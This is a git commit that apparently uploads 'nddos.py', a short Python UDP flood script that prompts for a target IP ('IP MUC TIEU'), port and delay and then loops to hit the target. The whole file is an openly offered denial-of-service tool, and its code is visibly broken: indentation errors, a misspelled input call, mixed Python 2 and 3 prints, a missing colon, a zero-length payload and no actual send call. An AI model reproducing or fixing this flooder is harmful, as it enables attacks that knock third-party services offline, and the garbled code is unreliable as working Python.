77becf9203e178de1c03815dfd88cf2a71074de4
Hacker1412 <54674881+Hacker1412@users.noreply.github.com>
2023-01-21 19:19:12 +0700

    Add files via upload

---
+++ nddos.py
@@ -0,0 +1,25 @@
+print ("\033[91m")
+
+import time
+import socket
+import random
+
+
+     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom((0))
+
+
+
+print "Coded By : Dung"
+print "Author   : H1F!V5"
+print ("\033[91m")
+ip = nput("IP MUC TIEU : ")
+port = int(input("Port       : "))
+sleep = float(input("sleep: "))
+s.connect((ip, port))
+for i in range(1, 100**1000)
+print(f"send: {i}", end='\r')
+time.sleep(sleep)
+
+
+
